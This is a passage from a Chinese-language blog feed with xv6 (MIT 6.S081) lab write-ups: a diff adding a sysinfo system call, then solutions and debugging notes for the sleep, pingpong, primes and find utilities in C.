unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.hindex 756d191..7954d98 100644<span class="token coord">--- a/kernel/syscall.h</span><span class="token coord">+++ b/kernel/syscall.h</span><span class="token coord">@@ -20,4 +20,5 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">#define SYS_trace  22 // here</span></span>\ No newline at end of file<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_trace  22 // here</span><span class="token prefix inserted">+</span><span class="token line">#define SYS_sysinfo 23</span></span>\ No newline at end of filediff --git a/kernel/sysproc.c b/kernel/sysproc.cindex 3ff51d9..644638f 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span><span class="token coord">@@ -6,6 +6,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#include "memlayout.h"</span><span class="token prefix unchanged"> </span><span class="token line">#include "spinlock.h"</span><span class="token prefix unchanged"> </span><span class="token line">#include "proc.h"</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#include "sysinfo.h"</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">uint64</span><span class="token prefix unchanged"> </span><span class="token line">sys_exit(void)</span></span>@@ -101,5 +102,26 @@ uint64 sys_trace(void) &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">if (argint(0, &amp;(myproc()->mask)) &lt; 0) &#123;</span><span class="token prefix unchanged"> </span><span class="token line">return -1;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_sysinfo(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">struct proc *p = myproc();</span><span class="token prefix inserted">+</span><span class="token line">struct sysinfo info;</span><span class="token prefix inserted">+</span><span class="token line">uint64 addr;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">info.freemem = freemem_bytes();</span><span class="token prefix inserted">+</span><span class="token line">info.nproc = proc_num();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// get argument addr</span><span class="token prefix inserted">+</span><span class="token line">if (argaddr(0, &amp;addr) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// copy data of info to addr</span><span class="token prefix inserted">+</span><span class="token line">if (copyout(p->pagetable, addr, (char *)&amp;info, sizeof(info)) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">return 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/user/user.h b/user/user.hindex 16107d6..37d15a5 100644<span class="token coord">--- a/user/user.h</span><span class="token coord">+++ b/user/user.h</span><span class="token coord">@@ -1,5 +1,6 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">struct stat;</span><span class="token prefix unchanged"> </span><span class="token line">struct rtcdate;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">struct sysinfo; // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// system calls</span><span class="token prefix unchanged"> </span><span class="token line">int fork(void);</span></span>@@ -24,6 +25,7 @@ char* sbrk(int);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);</span><span class="token prefix unchanged"> </span><span class="token line">int trace(int); // here</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int sysinfo(struct sysinfo *);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);</span></span>diff --git a/user/usys.pl b/user/usys.plindex 76c64ec..fde7c87 100755<span class="token coord">--- a/user/usys.pl</span><span class="token coord">+++ b/user/usys.pl</span>@@ -36,4 +36,5 @@ entry("getpid");<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">entry("trace"); # here</span></span>\ No newline at end of file<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("trace"); # here</span><span class="token prefix inserted">+</span><span class="token line">entry("sysinfo")</span></span>\ No newline at end of file</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xv6系统调用实现&quot;&gt;&lt;a href=&quot;#xv6系统调用实现&quot; class=&quot;headerlink&quot; title=&quot;xv6系统调用实现&quot;&gt;&lt;/a&gt;xv6系统调用实现&lt;/h1&gt;&lt;p&gt;不同于 Lab1 利用已实现的系统调用来实现一些用户态下的命令行程序，本 Lab 是</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Utilities</title>
    <link href="http://lordaeronesz.github.io/2024/06/24/MIT6.s081-2021-Lab%20Utilities/"/>
    <id>http://lordaeronesz.github.io/2024/06/24/MIT6.s081-2021-Lab%20Utilities/</id>
    <published>2024-06-24T12:45:11.000Z</published>
    <updated>2024-06-26T02:10:33.161Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Boot-xv6"><a href="#Boot-xv6" class="headerlink" title="Boot xv6"></a>Boot xv6</h1><p>按照示例切换到 <code>util</code> 分支后，看到目录下包含 <code>Makefile</code> 文件，执行 <code>make qemu</code> 即可。</p><h1 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>借助系统调用 <code>sleep</code> 实现一个命令行程序，关键是要找到封装了系统调用的 C 函数的位置，根据提示：</p><blockquote><p>… <code>user/user.h</code> for the C definition of <code>sleep</code> callable from a user program …</p></blockquote><p>可知该函数的声明位于 <code>user.h</code> 头文件中，声明方式很简单：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>将其“拷贝”（include）到需要编写的代码 <code>user/sleep.c</code> 中，调用 <code>sleep(&lt;睡眠时间&gt;)</code> 即可。</p><p>最后，按照提示，将编写的 <code>sleep</code> 代码添加到 Makefile 的 <code>UPROGS</code> 中，添加后如下所示：</p><pre class="language-makefile" data-language="makefile"><code class="language-makefile">UPROGS<span class="token operator">=</span>\    <span class="token variable">$U/_cat\</span>    <span class="token variable">$U/_echo\</span>    <span class="token variable">$U/_forktest\</span>    <span class="token variable">$U/_grep\</span>    <span class="token variable">$U/_init\</span>    <span class="token variable">$U/_kill\</span>    <span class="token variable">$U/_ln\</span>    <span class="token variable">$U/_ls\</span>    <span class="token variable">$U/_mkdir\</span>    <span class="token variable">$U/_rm\</span>    <span class="token variable">$U/_sh\</span>    <span class="token variable">$U/_stressfs\</span>    <span class="token variable">$U/_usertests\</span>    <span class="token variable">$U/_grind\</span>    <span class="token variable">$U/_wc\</span>    <span class="token variable">$U/_zombie\</span>    <span class="token variable">$U/_sleep\</span></code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/sleep.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span> <span class="token comment">// 注意先包含types.h</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span>    <span class="token comment">// 再包含user.h（user.h中存在在types.h中定义的别名）</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"sleep: argument count error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> time <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>本题主要是要理解管道的接口设计，以及借助该接口实现父进程与子进程之间的通信。这是 <code>xv6</code> 文档中对于 <code>pipe</code> 调用的描述：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">pipe</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// Create a pipe, put read/write file descriptors in p[0] and p[1].</span></code></pre><p><code>pipe</code> 创建一个管道，并分别将该管道的读、写端文件描述符置为 <code>p[0]</code> 和 <code>p[1]</code>，之后调用 <code>fork</code> 创建一个子进程，由于 <code>fork</code> 的作用是将父进程的数据直接拷贝给子进程，因此子进程同时继承了父进程的管道文件描述符，可以借助该文件描述符进行进程间通信（IPC），相当于借助一个共享文件进行通信，只不过该“文件”存储在内存的内核区域中，而不占用实际的磁盘存储空间。</p><p>利用管道解决本题的基本流程如下，首先需要创建两个管道 pa 和 pb，然后：</p><ol><li>父进程向管道 pa 的写端写入 1 字节数据，然后关闭 pa 的写端。</li><li>子进程从管道 pa 的读端读取 1 字节数据，然后关闭 pa 的读端，打印信息，然后向管道 pb 的写端写入 1 字节数据，关闭 pb 的写端。</li><li>父进程从管道 pb 的读端读取 1 字节数据，关闭 pb 的读端，最后打印信息。</li></ol><p>这里需要解释一下为什么需要两个管道（只是<strong>个人的方法</strong>，其它方法可能只需要一个管道），由于进程调度策略的影响，父进程和子进程的执行顺序并不确定。可能出现这样一种情况：在 <code>fork</code> 创建子进程后，父进程先被调度，将 1 字节数据写入管道，这时理想的情况是子进程被调度，然后读取父进程发送的数据，但是事实可能并不会如我们所愿，子进程可能一直得不到调度，父进程继续向下执行，从管道中读取自己刚刚发送的 1 字节的数据，这样子进程就无法收到父进程发送的数据，父子进程之间的通信也就失败了。</p><p>通过创建两个管道，并分别关闭对应的读端和写端，就能够得到两个单向数据流的管道，也就不会有上述自己写入的数据被被自己读取的情况出现。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/pingpong.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> pa<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pb<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">pipe</span><span class="token punctuation">(</span>pa<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pipe</span><span class="token punctuation">(</span>pb<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// phase_2</span><span class="token function">read</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d: received ping\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// phase_1</span><span class="token function">write</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pa<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// phase_3</span><span class="token function">read</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">close</span><span class="token punctuation">(</span>pb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d: received pong\n"</span><span class="token punctuation">,</span> <span class="token function">getpid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"pingpong: fork failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h1><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>实现一个基于管道的并发埃式筛（The sieve of Eratosthenes），关键是要理解管道的机制，以及仔细阅读题干给出的<a href="https://swtch.com/~rsc/thread/">文章</a>，该文章有关该埃式筛方法的介绍图片如下所示：</p><p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/primes.png" alt></p><p>该算法的个人感觉十分精妙，以下是基本流程：</p><ol><li>进程 0（主进程）发出一系列从 2 开始的整数序列。</li><li>进程 1 首先接收来自进程 0 发出的第一个整数 prime，prime 一定是一个质数，将其打印出来。然后继续按顺序接收来自进程 0 发出的其它整数，若接收到的某个整数能够被 prime 整除，则丢弃它（不做处理），否则将该整数发送给下一个进程。</li><li>后续进程的操作与进程 1 类似，直到没有任何整数发送给下一个进程，程序终止。</li></ol><p>算法的思路并不复杂，主要问题在于如何使用管道实现上述流程中进程 i 与进程 i + 1 之间的通信。我这里只使用了一个 <code>int[2]</code> 来轮换地存放管道的文件描述符，并使用一个缓冲区来暂存每次要发送给下一个进程的数，在一个进程完成它所做的工作后，再将缓冲区中的数据批量写入管道，并创建子进程来完成接下来的工作。这里要千万注意管道完成读取或写入后及时关闭，否则可能会出现子进程读取管道时阻塞的情况。</p><p>我在写下这篇博客的过程中发现，虽然我使用的这个方法能够达到预期的效果，并成功通过测试用例，但是其实是有一定问题的：本方法的处理过程是串行的。事实上，每个进程都是在将本进程的所有工作全部完成之后，再调用 <code>fork</code> 来创建子进程，完成后续的工作，本质上与放在一个进程中完成所有工作并没有区别，与文章中提到的 “<em>Concurrent</em>” 完全相悖。理想的做法应该是创建一个 <code>int[2]</code> 数组来存放管道的文件描述符，并及时 <code>fork</code> 子进程来工作，以此来实现并发，具体的代码实现有待后续改进。</p><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/primes.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"user/user.h"</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> p<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">pipe</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> buf<span class="token punctuation">;</span><span class="token keyword">int</span> plist<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">35</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">write</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>i<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">int</span> prime <span class="token operator">=</span> buf<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"prime %d\n"</span><span class="token punctuation">,</span> prime<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> pcnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>buf <span class="token operator">%</span> prime<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>plist<span class="token punctuation">[</span>pcnt<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">pipe</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// rotating pipe</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pcnt<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">write</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>plist <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">wait</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"primes: fork error\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="find"><a href="#find" class="headerlink" title="find"></a>find</h1><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><p>本题是这个 Lab 中我花费时间最长的，代码思路虽然不算很复杂，但是有很多的细节问题我在写的时候没有考虑到，感觉 debug 时间差不多是 coding 的几倍了。。。</p><p>题目要求实现一个简易的 <code>find</code> 命令，根据提示可以参考 <code>user/ls.c</code> 对目录的读取操作，并使用递归来实现对子目录的查找。基本思路就是打开一个指定路径的文件（目录也算是特殊的文件），并根据文件的类型做不同处理：</p><ol><li>如果文件是常规文件，则判断改文件名是否是目标文件名（<code>find</code> 的第二个参数），如果是，则将其完整路径打印至标准输出。</li><li>如果文件是目录文件，则读取该目录下的所有文件名，并在该目录路径尾部加上 <code>/st.name</code>，依次构造一个新的文件名继续递归调用 <code>find</code>。注意不要递归进入 <code>.</code> 和 <code>..</code>，否则将导致无限递归。 </li></ol><p>以上便是基本思路，具体实现可以阅读完整代码，下面讲一下我遇到的一些问题（bug）：</p><ol><li>使用 <code>fstat</code> 获取文件信息时 <code>st.type</code> 始终为 3（<code>T_DEVICE</code> 类型）。</li></ol><p>这个问题其实挺难绷的，原因是我把 <code>if ((fd = open(path, 0)) &lt; 0)</code> 写成了 <code>if ((fd = open(path, 0) &lt; 0))</code>，因为 <code>&lt;</code> 的优先级大于 <code>=</code>，所以导致 <code>fd</code> 的值始终为 0 或 1（逻辑表达式的值只能为真或假），那么后续产生意想不到的结果也就不意外了。。。</p><ol><li>出现 <code>find: cannot open file ./sh</code> ，之后所有文件均打开失败</li></ol><p>在打印出文件描述符的值后，问题的起因比较明显了。</p><p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/fd.png" alt></p><p>文件描述符一直在增大，最终文件打开失败，<code>open</code> 返回 -1。很明显，是因为文件在打开后没有及时关闭，并释放文件描述符，最终文件描述符被全部占用，新的文件无法再被打开。这也解释了既然程序退出后，所有打开的文件会自动关闭，为什么还要建议手动关闭文件的问题。</p><ol><li>读取到空文件名</li></ol><p>前面的问题解决之后，我发现程序仍然会出现无限递归搜索的情况（如下图所示），按理说我已经对文件名进行了判断，如果是 <code>.</code> 或者 <code>..</code> 则不做处理。</p><p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/recur.png" alt></p><p>尝试打印文件名之后，我发现目录的最后一个文件名为空，这样的空文件名将导致程序不断往其末尾追加斜杠 <code>/</code> 而并没有递归进入该目录中。</p><p><img src="/2024/06/24/MIT6.s081-2021-Lab%20Utilities/bfg.png" alt></p><p>事实上，使用 <code>read</code> 读取目录时，在读取目录的所有条目之后，会返回一个空的 <code>dirent</code> 结构体，此时 <code>de.name</code> 为空，作为循环结束的标志。其实 <code>user/ls.c</code> 有针对这个特性的判断，不过当时 coding 的时候没有细看。所以正如 Lab guidance 中所说：</p><blockquote><p>Only when you have a firm grasp of the assignment and solution, then start coding.</p></blockquote><h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// user/find.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/types.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/stat.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"kernel/fs.h"</span></span><span class="token macro property"><span 